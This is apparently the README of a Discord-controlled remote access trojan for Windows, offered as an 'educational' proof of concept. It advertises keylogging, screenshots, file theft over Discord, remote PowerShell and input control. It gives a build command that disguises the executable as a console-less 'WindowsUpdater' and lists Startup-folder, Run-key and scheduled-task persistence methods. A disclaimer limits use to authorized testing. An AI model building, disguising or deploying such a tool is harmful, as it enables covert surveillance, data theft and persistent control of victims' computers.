# G.H.O.S.T. - Discord Remote Access Tool (Educational / PoC)

**G.H.O.S.T.** (Ghost Hidden Operator Stealth Tool) is a proof-of-concept Discord bot that provides remote access and control over a Windows machine via Discord messages.

This project is a **modified and improved version** of the RAT demonstrated in [this](https://www.youtube.com/watch?v=7eaFEZnuh0I) YouTube tutorial

I watched the video, followed the core idea, and added several enhancements such as:
- Token loading from `.env`
- Non-blocking PowerShell execution with timeout
- Better error handling
- Screenshot feature
- File upload/download commands
- Clean builder support


**DISCLAIMER**  
This tool is intended **ONLY for educational purposes, security research, and authorized testing** on systems you own or have explicit written permission to access.  
Unauthorized use on any system is illegal in most jurisdictions (e.g., unauthorized access, computer fraud, privacy violations).  
The author is not responsible for any misuse, damage, or legal consequences resulting from this code.

## Features

- **Stealth Operation**: Creates hidden control channel with IP-based naming
- **PowerShell Integration**: Persistent PowerShell session for command execution
- **File Management**: Upload/download files between Discord and target system
- **Screen Capture**: Take screenshots remotely
- **Process Control**: Start/kill applications and processes
- **Keylogging**: Capture keystrokes (optional module required)
- **Mouse & Keyboard Control**: Remote typing and mouse operations
- **System Information**: Get detailed system specs and status
- **Error Handling**: Graceful fallbacks for missing modules

## Requirements

- Windows (tested on Windows 10/11)
- Python 3.10+
- Internet connection
- Discord bot token

Install dependencies:

```bash
pip install -r requirements.txt
```


## Installation

1) Clone or download the project files

```bash
git clone https://github.com/MattiaAlessi/DS_RAT_GHOST.git
cd DS_RAT_GHOST

# Copy the example file and add your credentials
copy .env.example .env
```
Edit .env and insert your real Discord bot token from [this](https://discord.com/developers/applications) link 

2) Run the bot directly (only for testing):

```bash
python main.py
```

3) Build Standalone Executable (Recommended)  
   To create a single-file .exe (no console window):
```bash
pyinstaller --onefile --noconsole
  --name "WindowsUpdater"
  --add-data ".env;."
  --upx-dir "C:\upx"
  --clean
  main.py
  ```


## Available Commands
**In any channel**:

- !commands → Show command list
- !screenshot → Capture and upload desktop screenshot
- !load [folder] → Save attachments from the message to the PC
- !download <path> → Upload file from PC to Discord
- !sysinfo → Gets some stats

**In the control channel (control-xxx.xxx.xxx.xxx)**:

- PowerShell Commands: Type directly without prefix (e.g., whoami, Get-Process, dir)
- !kill <process_name> → Terminate process by name
- !start <app_name> → Start application
- !type <text> → Type text remotely
- !press <key> → Press key or key combination (e.g., enter, ctrl+c, alt+f4)
- !click <button> <count> → Click mouse button multiple times
- !keylog start|stop|clear|show → Keylogger controls


**Persistence** (not yet included)
The bot runs only while the process is active.
Persistence (auto-start on boot/login) is not implemented by default.
Common manual methods:

- Copy the .exe to Startup folder "C:\Users\<YourUser>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
- Add to Registry "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
- Create a scheduled task (schtasks)

## Security & Legal Notes

Use responsibly — only on systems you own or have clear authorization for
Always test in a clean virtual machine first

License
For educational and research purposes only.
No license granted for malicious or unauthorized use.
Use at your own risk.
